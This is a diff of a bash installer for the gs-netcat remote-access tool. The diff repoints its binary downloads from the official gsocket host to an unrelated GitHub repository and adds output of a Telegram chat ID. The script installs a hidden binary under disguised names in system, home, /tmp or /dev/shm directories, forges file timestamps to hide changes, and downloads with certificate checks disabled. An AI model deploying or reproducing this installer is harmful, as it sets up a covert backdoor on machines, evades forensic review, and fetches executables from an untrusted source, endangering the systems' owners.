@@ -1,20 +1,19 @@
 #! /usr/bin/env bash
 
-URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://gsocket.io"
+URL_BASE_CDN="https://github.com/X-Projetion/MOMONO/raw/refs/heads/main/"
+URL_BASE_X="https://github.com/X-Projetion/MOMONO/raw/refs/heads/main/"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
 }
-URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
-URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+URL_BIN="${URL_BASE_CDN}/bin"
+URL_BIN_FULL="${URL_BASE_CDN}/full" 
 [[ -n $GS_URL_BIN ]] && {
 	URL_BIN="${GS_URL_BIN}"
 	URL_BIN_FULL="$URL_BIN"
 }
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
 
-# STUBS for deploy_server.sh to fill out:
 gs_deploy_webhook=
 GS_WEBHOOK_404_OK=
 [[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
@@ -61,16 +60,16 @@ BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
 CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
 
 [[ -t 1 ]] && {
-	CY="\033[1;33m" # yellow
-	CDY="\033[0;33m" # yellow
-	CG="\033[1;32m" # green
-	CR="\033[1;31m" # red
-	CDR="\033[0;31m" # red
-	CB="\033[1;34m" # blue
-	CC="\033[1;36m" # cyan
-	CDC="\033[0;36m" # cyan
-	CM="\033[1;35m" # magenta
-	CN="\033[0m"    # none
+	CY="\033[1;33m" 
+	CDY="\033[0;33m" 
+	CG="\033[1;32m" 
+	CR="\033[1;31m" 
+	CDR="\033[0;31m" 
+	CB="\033[1;34m" 
+	CC="\033[1;36m" 
+	CDC="\033[0;36m" 
+	CM="\033[1;35m" 
+	CN="\033[0m"
 	CW="\033[1;37m"
 }
 
@@ -89,15 +88,13 @@ _ts_fix()
 	fn="$1"
 	ts="$2"
 
-	args=() #OSX, must init or " " in touch " " -r 
+	args=()
 
 	[[ ! -e "$1" ]] && return
 	[[ -z $ts ]] && return
 
-	# Change the symlink for ts_systemd_fn items
 	[[ -n "$3" ]] && args=("-h")
 
-	# Either reference by Timestamp or File
 	[[ "${ts:0:1}" = '/' ]] && {
 		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
 		ax=("${args[@]}" "-r" "$ts" "$fn")
@@ -106,12 +103,10 @@ _ts_fix()
 	}
 	ax=("${args[@]}" "-t" "$ts" "$fn")
 	touch "${ax[@]}" 2>/dev/null && return
-	# If 'date -r' or 'touch -t' failed:
 	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
 	touch "${ax[@]}" 2>/dev/null
 }
 
-# Restore timestamp of files
 ts_restore()
 {
 	local fn
@@ -125,7 +120,6 @@ ts_restore()
 		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
 		ts="${_ts_ts_a[$n]}"
 		fn="${_ts_fn_a[$n]}"
-		# DEBUGF "RESTORE-TS ${fn} ${ts}"
 		((n++))
 
 		_ts_fix "$fn" "$ts"
@@ -138,7 +132,6 @@ ts_restore()
 		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
 		ts="${_ts_systemd_ts_a[$n]}"
 		fn="${_ts_systemd_fn_a[$n]}"
-		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
 		((n++))
 
 		_ts_fix "$fn" "$ts" "symlink"
@@ -154,15 +147,13 @@ ts_is_marked()
 	fn="$1"
 
 	for a in "${_ts_fn_a[@]}"; do
-		[[ "$a" = "$fn" ]] && return 0 # True
+		[[ "$a" = "$fn" ]] && return 0 
 	done
 
-	return 1 # False
+	return 1 
 }
 
-# There are some files which need TimeStamp update after all other TimeStamps
-# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
-# ts_add_last [file] <reference file>
+
 ts_add_systemd()
 {
 	local fn
@@ -176,15 +167,10 @@ ts_add_systemd()
 		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
 	}
 
-	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
 	_ts_systemd_ts_a+=("$ts")
 	_ts_systemd_fn_a+=("$fn")
 }
 
-# Determine the Timestamp of the file $fn that is about to be
-# created (or already exists).
-# Sets $_ts_ts to Timestamp.
-# Usage: _ts_get_ts [$fn]
 _ts_get_ts()
 {
 	local fn
@@ -195,25 +181,20 @@ _ts_get_ts()
 
 	unset _ts_ts
 	unset _ts_pdir_by_us
-	# Inherit Timestamp if parent directory was created
-	# by us.
 	n=0
 	while :; do
 		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
 		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
 			_ts_ts="${_ts_ts_a[$n]}"
 			_ts_pdir_by_us=1
-			# DEBUGF "Parent ${pdir} created by us."
+
 			return
 		}
 		((n++))
 	done
 
-	# Check if file exists.
-	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
 
-	# Take ts from oldest file in directory
-	# shellcheck disable=SC2012 #Use find instead of ls => not portable
+	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
 	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
 	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
 }
@@ -221,16 +202,13 @@ _ts_get_ts()
 
 _ts_add()
 {
-	# Retrieve TimeStamp for $1
+
 	_ts_get_ts "$1"
-	# Add TimeStamp
 	_ts_ts_a+=("$_ts_ts")
 	_ts_fn_a+=("$1");
 	_ts_mkdir_fn_a+=("$2")
 }
 
-# Note: Do not use global _ts variables except _ts_add_direct
-# Usage: mk_file [filename]
 mk_file()
 {
 	local fn
@@ -240,31 +218,23 @@ mk_file()
 	fn="$1"
 	local exists
 
-	# DEBUGF "${CC}MK_FILE($fn)${CN}"
 	pdir="$(dirname "$fn")"
 	[[ -e "$fn" ]] && exists=1
 
 	ts_is_marked "$pdir" || {
-		# HERE: Parent not tracked
 		_ts_add "$pdir" "<NOT BY XMKDIR>"
 		pdir_added=1
 	}
 
 	ts_is_marked "$fn" || {
-		# HERE: Not yet tracked
 		_ts_get_ts "$fn"
-		# Do not add creation fails.
 		touch "$fn" 2>/dev/null || {
-			# HERE: Permission denied
 			[[ -n "$pdir_added" ]] && {
-				# Remove pdir if it was added above
-				# Bash <5.0 does not support arr[-1]
-				# Quote (") to silence shellcheck
 				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
 				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
 				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
 			}
-			return 69 # False
+			return 69
 		}
 		[[ -z $exists ]] && chmod 600 "$fn"
 		_ts_ts_a+=("$_ts_ts")
@@ -304,15 +274,12 @@ xrm()
 	pdir="$(dirname "$fn")"
 
 	ts_is_marked "$pdir" || {
-		# HERE: Parent is not tracked.
 		_ts_add "$pdir" "<RM-UNTRACKED>"
 	}
 
 	rm -f "$1" 2>/dev/null
 }
 
-# Create a directory if it does not exist and fix timestamp
-# xmkdir [directory] <ts reference file>
 xmkdir()
 {
 	local fn
@@ -321,21 +288,17 @@ xmkdir()
 
 	DEBUGF "${CG}XMKDIR($fn)${CN}"
 	pdir="$(dirname "$fn")"
-	true # reset $?
-	[[ -d "$fn" ]] && return     # Directory already exists
-	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)
+	true 
+	[[ -d "$fn" ]] && return
+	[[ ! -d "$pdir" ]] && return 
 
-	# Check if parent is being tracked
 	ts_is_marked "$pdir" || {
-		# HERE: Parent not tracked
-		# We did not create the parent or we would be tracking it.
+
 		_ts_add "$pdir" "<NOT BY XMKDIR>"
 	}
 
-	# Check if new directory is already tracked
 	ts_is_marked "$fn" || {
-		# HERE: Not yet tracked (normal case)
-		_ts_add "$fn" "$fn" # We create the directory (below)
+		_ts_add "$fn" "$fn"
 	}
 
 	mkdir "$fn" 2>/dev/null || return
@@ -350,7 +313,6 @@ xcp()
 	src="$1"
 	dst="$2"
 
-	# DEBUGF "${CG}XCP($src, $dst)${CN}"
 	mk_file "$dst" || return
 	cp "$src" "$dst" || return
 	true
@@ -393,54 +355,35 @@ errexit()
 	exit_code 255
 }
 
-# Test if directory can be used to store executeable
-# try_dstdir "/tmp/.gs-foobar"
-# Return 0 on success.
 try_dstdir()
 {
 	local dstdir
 	local trybin
 	dstdir="${1}"
 
-	# Create directory if it does not exists.
 	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }
 
 	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
  
 	mk_file "$DSTBIN" || return 102
 
-	# Find an executeable and test if we can execute binaries from
-	# destination directory (no noexec flag)
-	# /bin/true might be a symlink to /usr/bin/true
 	for ebin in "/bin/true" "$(command -v id)"; do
 		[[ -z $ebin ]] && continue
 		[[ -e "$ebin" ]] && break
 	done
-	[[ ! -e "$ebin" ]] && return 0 # True. Try our best
+	[[ ! -e "$ebin" ]] && return 0 
 
-	# Must use same name on busybox-systems
 	trybin="${dstdir}/$(basename "$ebin")"
-
-	# /bin/true might be a symlink to /usr/bin/true
 	[[ "$ebin" -ef "$trybin" ]] && return 0
 	mk_file "$trybin" || return
-
-	# Return if both are the same /bin/true and /usr/bin/true
 	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
 	chmod 700 "$trybin"
-
-	# Between 28th April and end of May 2020 we accidentially
-	# over wrote /bin/true with gs-bd binary. Thus we use -g
-	# to make true, id and gs-bd return true (in case it's gs-bs).
-	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
+	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; }
 	rm -f "${trybin:?}"
 
 	return 0
 }
 
-
-
-# Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
 	if [[ -n "$GS_DSTDIR" ]]; then
@@ -449,20 +392,15 @@ init_dstbin()
 		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
 	fi
 
-	# Try systemwide installation first
 	try_dstdir "${GS_PREFIX}/usr/bin" && return
 
-	# Try user installation
 	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
 	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return
 
-	# Try current working directory
 	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
 
-	# Try /tmp/.gsusr-*
 	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
 
-	# Try /dev/shm as last resort
 	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
 
 	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
@@ -472,7 +410,7 @@ init_dstbin()
 
 try_tmpdir()
 {
-	[[ -n $TMPDIR ]] && return # already set
+	[[ -n $TMPDIR ]] && return
 
 	[[ ! -d "$1" ]] && return
 
@@ -497,8 +435,6 @@ try_encode()
 	DECODE_STR="$dec"
 }
 
-
-# Return TRUE if we are 100% sure it's little endian
 is_le()
 {
 	command -v lscpu >/dev/null && {
@@ -515,7 +451,6 @@ is_le()
 
 init_vars()
 {
-	# Select binary
 	local arch
 	local osname
 	arch=$(uname -m)
@@ -526,7 +461,6 @@ init_vars()
 		WARN "HOME not set. Using 'HOME=$HOME'"
 	fi
 
-	# set PWD if not set
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
 
 	[[ -z "$OSTYPE" ]] && {
@@ -545,7 +479,6 @@ init_vars()
 
 	unset OSARCH
 	unset SRC_PKG
-	# User supplied OSARCH
 	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
 
 	if [[ -z "$OSARCH" ]]; then
@@ -560,7 +493,7 @@ init_vars()
 				OSARCH="arm-linux"
 				SRC_PKG="gs-netcat_mini-linux-armv7l"
 			elif [[ "$arch" == *"armv"* ]]; then
-				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
+				OSARCH="arm-linux" 
 				SRC_PKG="gs-netcat_mini-linux-arm"
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
@@ -568,7 +501,6 @@ init_vars()
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
 				SRC_PKG="gs-netcat_mini-linux-mips64"
-				# Go 32-bit if Little Endian even if 64bit arch
 				is_le && {
 					OSARCH="mipsel32-alpine"
 					SRC_PKG="gs-netcat_mini-linux-mipsel"
@@ -584,9 +516,7 @@ init_vars()
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
 				OSARCH="x86_64-osx" # M1
-				## FIXME: really needs M3 here..
 				SRC_PKG="gs-netcat_mini-macOS-x86_64"
-				# OSARCH="arm64-osx" # M1
 			else
 				OSARCH="x86_64-osx"
 				SRC_PKG="gs-netcat_mini-macOS-x86_64"
@@ -1267,9 +1197,12 @@ dl()
 	if [[ -n $IS_USE_CURL ]]; then
 		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
         echo "Downloading from: ${URL_BIN}/${1}"
+        echo "$GS_TG_CHATID"
 	elif [[ -n $IS_USE_WGET ]]; then
 		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
         echo "Downloading from: ${URL_BIN}/${1}"
+        echo "$GS_TG_CHATID"
+
 
 	else
 		# errexit "Need curl or wget."
